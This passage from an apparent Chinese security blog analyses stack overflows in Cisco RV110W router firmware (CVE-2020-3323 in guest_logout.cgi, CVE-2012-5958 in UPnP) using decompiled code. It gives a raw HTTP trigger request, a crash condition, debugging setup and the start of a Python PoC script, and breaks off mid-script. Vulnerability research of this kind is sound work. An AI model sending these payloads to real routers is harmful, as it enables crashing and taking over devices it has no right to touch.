class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined4 <span class="title">guest_logout_cgi</span><span class="params">(undefined4 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cVar1;</span><br><span class="line">  <span class="keyword">bool</span> bVar2;</span><br><span class="line">  <span class="keyword">int</span> cmac2;</span><br><span class="line">  <span class="keyword">char</span> *cmac;</span><br><span class="line">  <span class="keyword">size_t</span> cmac_len;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  <span class="keyword">char</span> *__s1;</span><br><span class="line">  <span class="keyword">char</span> *cmac_end;</span><br><span class="line">  <span class="keyword">char</span> *maybe_vuln;</span><br><span class="line">  <span class="keyword">char</span> *local_c0;</span><br><span class="line">  undefined1 *local_bc;</span><br><span class="line">  <span class="keyword">char</span> *local_b8;</span><br><span class="line">  <span class="keyword">char</span> *local_b4;</span><br><span class="line">  undefined4 local_b0;</span><br><span class="line">  <span class="keyword">char</span> acStack172 [<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack108 [<span class="number">68</span>];</span><br><span class="line">  </span><br><span class="line">  cmac2 = get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">  cmac = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac);</span><br><span class="line">  cmac_end = (<span class="keyword">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac &lt; cmac_end) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *cmac_end;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">'\n'</span>) &amp;&amp; (cVar1 != <span class="string">'\r'</span>)) &amp;&amp; (cVar1 != <span class="string">' '</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *cmac_end = <span class="string">'\0'</span>;</span><br><span class="line">      cmac_end = cmac_end + <span class="number">-1</span>;</span><br><span class="line">      cmac = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac &lt; cmac_end);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">  cmac2 = get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">  cmac_end = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac_end);</span><br><span class="line">  maybe_vuln = (<span class="keyword">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac_end = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac_end &lt; maybe_vuln) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *maybe_vuln;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">'\n'</span>) &amp;&amp; (cVar1 != <span class="string">'\r'</span>)) &amp;&amp; (cVar1 != <span class="string">' '</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *maybe_vuln = <span class="string">'\0'</span>;</span><br><span class="line">      maybe_vuln = maybe_vuln + <span class="number">-1</span>;</span><br><span class="line">      cmac_end = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac_end &lt; maybe_vuln);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac_end = (<span class="keyword">char</span> *)get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">  maybe_vuln = (<span class="keyword">char</span> *)get_cgi(<span class="string">"submit_button"</span>);</span><br><span class="line">  <span class="keyword">if</span> (maybe_vuln == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    maybe_vuln = <span class="string">""</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac_end == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(acStack108,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack172,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  __stream = fopen(<span class="string">"/dev/console"</span>,<span class="string">"w"</span>);</span><br><span class="line">  <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">"\n  mac=[%s], ip=[%s], submit_button=[%s]\n"</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = VERIFY_MAC_17(cmac);</span><br><span class="line">  <span class="keyword">if</span> ((cmac2 == <span class="number">0</span>) || (cmac2 = VERIFY_IPv4(cmac_end), cmac2 == <span class="number">0</span>)) &#123;</span><br><span class="line">    __stream = fopen(<span class="string">"/dev/console"</span>,<span class="string">"w"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream == (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">"\n%s(%d)  Drop session,VALID_FAIL, mac=[%s], ip=[%s],submit_button=[%s]\n"</span>,</span><br><span class="line">            <span class="string">"guest_logout_cgi"</span>,<span class="number">0x1542</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = <span class="built_in">strstr</span>(maybe_vuln,<span class="string">"status_guestnet.asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">LAB_00431d24:</span><br><span class="line">    __s1 = (<span class="keyword">char</span> *)nvram_get(<span class="string">"http_client_mac"</span>);</span><br><span class="line">    <span class="keyword">if</span> (((__s1 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) || (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac), cmac2 == <span class="number">0</span>)) &amp;&amp;</span><br><span class="line">       ((__s1 = (<span class="keyword">char</span> *)nvram_get(<span class="string">"http_client_ip"</span>), __s1 == (<span class="keyword">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">        (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac_end), cmac2 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      bVar2 = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00431c68;</span><br><span class="line">    &#125;</span><br><span class="line">    __stream = fopen(<span class="string">"/dev/console"</span>,<span class="string">"w"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,</span><br><span class="line">              <span class="string">"\n%s(%d)  Drop session, ip and mac invmatch,mac=[%s], ip=[%s],submit_button=[%s]\n"</span>,</span><br><span class="line">              <span class="string">"guest_logout_cgi"</span>,<span class="number">0x1551</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(maybe_vuln,<span class="string">"%[^;];%*[^=]=%[^\n]"</span>,acStack108,acStack172);</span><br><span class="line">    __stream = fopen(<span class="string">"/dev/console"</span>,<span class="string">"w"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">"\n%s(%d),submit_button = [%s] url=[%s], session_id=[%s]\n"</span>,</span><br><span class="line">              <span class="string">"guest_logout_cgi"</span>,<span class="number">0x1549</span>,maybe_vuln,acStack108,acStack172);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    __s1 = (<span class="keyword">char</span> *)nvram_get(<span class="string">"session_key"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s1 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">    cmac2 = <span class="built_in">strcmp</span>(__s1,acStack172);</span><br><span class="line">    bVar2 = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">LAB_00431c68:</span><br><span class="line">    syslog(<span class="number">6</span>,<span class="string">"The mac is %s and IP is %s of guest network user logout."</span>,cmac,cmac_end);</span><br><span class="line">    <span class="keyword">if</span> ((debug != <span class="number">0</span>) &amp;&amp; (__stream = fopen(<span class="string">"/dev/console"</span>,<span class="string">"w"</span>), __stream != (FILE *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">"%s(): \n  mac=[%s], ip=[%s],submit_button=[%s]\n"</span>,<span class="string">"guest_logout_cgi"</span>,cmac,</span><br><span class="line">              cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    local_c0 = <span class="string">"/sbin/cron_gn"</span>;</span><br><span class="line">    local_bc = &amp;DAT_00485fe4;</span><br><span class="line">    local_b0 = <span class="number">0</span>;</span><br><span class="line">    local_b8 = cmac;</span><br><span class="line">    local_b4 = cmac_end;</span><br><span class="line">    _eval(&amp;local_c0,<span class="string">"&gt;/dev/console"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((bVar2) &amp;&amp; (cmac2 = <span class="built_in">strcmp</span>(acStack108,<span class="string">"status_guestnet.asp"</span>), cmac2 == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">goto</span> LAB_00431de8;</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">"login_guest.asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00431de8:</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(acStack108);</span><br><span class="line">  <span class="keyword">if</span> (cmac_len &lt; <span class="number">6</span>) &#123;</span><br><span class="line">    do_ej(maybe_vuln,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    do_ej(acStack108,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第 52 行使用 get_cgi 函数获取 submit_button 字段的内容，第 80 行使用 strstr 判断其中是否存在字符串 “status_guestnet.asp”，如果存在，则执行第 99 行的代码，使用 sscanf 将数据拷贝到两个栈变量中。</p>
+<p>很明显这里存在栈溢出漏洞，如果用户构造一个包含 “status_guestnet.asp” 的超长字符串，就可以触发栈溢出漏洞，进而结合 ROP 等技术实现任意代码执行。(攻击分析见下文)</p>
+<p>经过测试，这个函数对应的后台接口是 guest_logout.cgi，并且不需要身份验证，所以我们可以构造下面的数据包触发此漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /guest_logout.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 160</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: iframe</span><br><span class="line">Referer: https://192.168.1.1/config_user.asp;session_id=8ba902bb5765a3645d189cccb60f2259</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">cmac=00:01:02:03:04:05&amp;cip=192.168.1.1&amp;submit_button=status_guestnet.aspaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：在第 38 行尝试获取 cip 字段的内容，如果我们不提供这个字段，将返回 0，经验证会在 strlen 函数中导致空指针解引用，可以使 httpd 服务崩溃。</strong></p>
+<h2 id="CVE-2012-5958？"><a href="#CVE-2012-5958？" class="headerlink" title="CVE-2012-5958？"></a>CVE-2012-5958？</h2><h3 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息： <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130129-upnp" target="_blank" rel="noopener">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130129-upnp</a></p>
+<p>漏洞评分：10.0(<strong>Critical</strong>)</p>
+<p>漏洞描述：此漏洞位于通用组件 libupnp 中，此组件存在多个栈溢出漏洞，成功利用此漏洞的攻击者可以获取设备的最高权限，并且在多数情况下，此服务可以从 WAN 侧访问。</p>
+<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞影响哪些设备暂时不明，影响范围未知，根据 Cisco 官方通告来看，这个漏洞早在 2013 年就被修复了，但 RV110W 最新版中仍存在此漏洞，至于它使用的是不是 libupnp 组件，暂时无法确定。</p>
+<p>此漏洞存在于解析 SSDP 协议的过程，位于函数 m_search_handler，代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">m_search_handler</span><span class="params">(<span class="keyword">int</span> upnp_context)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="keyword">char</span> *__s;</span><br><span class="line">  <span class="keyword">char</span> *pcVar3;</span><br><span class="line">  <span class="keyword">char</span> *maybe_vuln;</span><br><span class="line">  <span class="keyword">char</span> **ppcVar4;</span><br><span class="line">  <span class="keyword">int</span> *piVar5;</span><br><span class="line">  <span class="keyword">char</span> acStack168 [<span class="number">128</span>];</span><br><span class="line">  </span><br><span class="line">  ssdp_get_cur_ifp();</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39a0</span>) != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39a0</span>),<span class="string">"239.255.255.250:1900"</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39a4</span>) != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39a4</span>),<span class="string">"\"ssdp:discover\""</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39ac</span>) != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        iVar1 = atoi(*(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39ac</span>));</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        maybe_vuln = *(<span class="keyword">char</span> **)(upnp_context + <span class="number">0x39a8</span>);</span><br><span class="line">        <span class="keyword">if</span> (maybe_vuln == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">"ssdp:all"</span>);</span><br><span class="line">        uVar2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">"upnp:rootdevice"</span>);</span><br><span class="line">          uVar2 = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,<span class="string">"uuid:"</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">              piVar5 = *(<span class="keyword">int</span> **)(*(<span class="keyword">int</span> *)(upnp_context + <span class="number">0x50</span>) + <span class="number">0x2c</span>);</span><br><span class="line">              <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (piVar5 == (<span class="keyword">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ppcVar4 = *(<span class="keyword">char</span> ***)(piVar5[<span class="number">2</span>] + <span class="number">0xc</span>);</span><br><span class="line">                <span class="keyword">while</span> (__s = *ppcVar4, __s != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">                  pcVar3 = ppcVar4[<span class="number">0xb</span>];</span><br><span class="line">                  ppcVar4 = ppcVar4 + <span class="number">0xc</span>;</span><br><span class="line">                  <span class="keyword">if</span> (pcVar3 != (<span class="keyword">char</span> *)<span class="number">0x2</span>) &#123;</span><br><span class="line">                    iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,__s,__n);</span><br><span class="line">                    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">                      iVar1 = <span class="built_in">memcmp</span>(maybe_vuln + __n,<span class="string">":1"</span>,<span class="number">2</span>);</span><br><span class="line">                      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> (pcVar3 == (<span class="keyword">char</span> *)<span class="number">0x1</span>) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">4</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">'\0'</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ((pcVar3 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) || (pcVar3 == (<span class="keyword">char</span> *)<span class="number">0x3</span>)) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">5</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">'\0'</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                piVar5 = (<span class="keyword">int</span> *)*piVar5;</span><br><span class="line">              &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">            &#125;</span><br><span class="line">                    <span class="comment">/* 溢出 */</span></span><br><span class="line">            <span class="built_in">strcpy</span>(acStack168,maybe_vuln + <span class="number">5</span>);</span><br><span class="line">            uVar2 = <span class="number">3</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LAB_00405c94:</span><br><span class="line">        ssdp_msearch_response(upnp_context,acStack168,uVar2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第 30 行代码从 upnp_context 结构体中获取了某个数据，通过对下面流程的分析可以确定这里获取的是 ST 字段，第 78 行代码引用了 strcpy 函数将内容直接拷贝到栈变量中，如果攻击者传入一个超长的字符串，将导致栈溢出。(攻击分析见下文)</p>
+<h2 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h2><p>在具体分析之前，先设置好分析环境，拆开路由器之后在右上角可以找到 UART 串口，并且标记了接口名称，只需要焊接好排针就可以使用了。</p>
+<p><img src="/img/CVE-2020-3323-1.jpg" alt></p>
+<p>接入 FT232 之后在电脑打开串口软件，设备启动完毕按回车拿到 shell</p>
+<p><img src="/img/CVE-2020-3323-2.png" alt></p>
+<p>先上传一个 gdbserver 方便后续调试，设备默认带了 wget 命令，我们可以在本机开启一个 Server 放入 gdbserver，然后用 wget 下载到路由器。</p>
+<p>gdbserver 下载链接：链接：<a href="https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg" target="_blank" rel="noopener">https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg</a>     提取码：yyln </p>
+<p>wget 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.101:8000/gdbserver.mipsle</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-3323-1"><a href="#CVE-2020-3323-1" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h3><p>经过上面的环境配置，我们现在可以对 httpd 服务进行调试，先在路由器上面找到 httpd 进程 pid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep http</span><br></pre></td></tr></table></figure>
+
+<p>这里会返回两个结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ps | grep http</span><br><span class="line">  348 admin      6284 S   httpd </span><br><span class="line">  356 admin      6344 S   httpd -S</span><br></pre></td></tr></table></figure>
+
+<p>其中 httpd -S 是我们的调试目标。启动 gdbserver 进行附加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver.mipsle 192.168.1.1:12345 --attach 356</span><br></pre></td></tr></table></figure>
+
+<p>成功附加之后在本机启动 gdb-multiarch，执行下面的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set sysroot ./</span><br><span class="line">file ./usr/sbin/httpd</span><br><span class="line">target remote 192.168.1.1:12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/CVE-2020-3323-3.png" alt></p>
+<p>成功启动调试环境，可以先编写一个 POC 脚本，方便后续操作，之前分析了漏洞成因，可编写出下面的 POC 脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'-ip'</span>, help=<span class="string">'target ip'</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.ip:</span><br><span class="line">    payload = <span class="string">"status_guestnet.asp"</span> +<span class="string">"a"</span> * <span class="number">0x100</span></span><br><span class="line">    burp0_url = <span class="string">"https://"</span> + args.ip + <span class="string">":443/guest_logout.cgi"</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">"Connection"</span>: <span class="string">"close"</span>, </span><br><span class="line">                     <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"cmac"</span>: <span class="string">"00:01:02:03:04:05"</span>, </span><br><span class="line">                  <span class="string">"cip"</span>: <span class="string">"192.168.1.1"</span>,</span><br><span class="line">                  <span class="string">"submit_button"</span>: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=<span class="literal">False</span>, 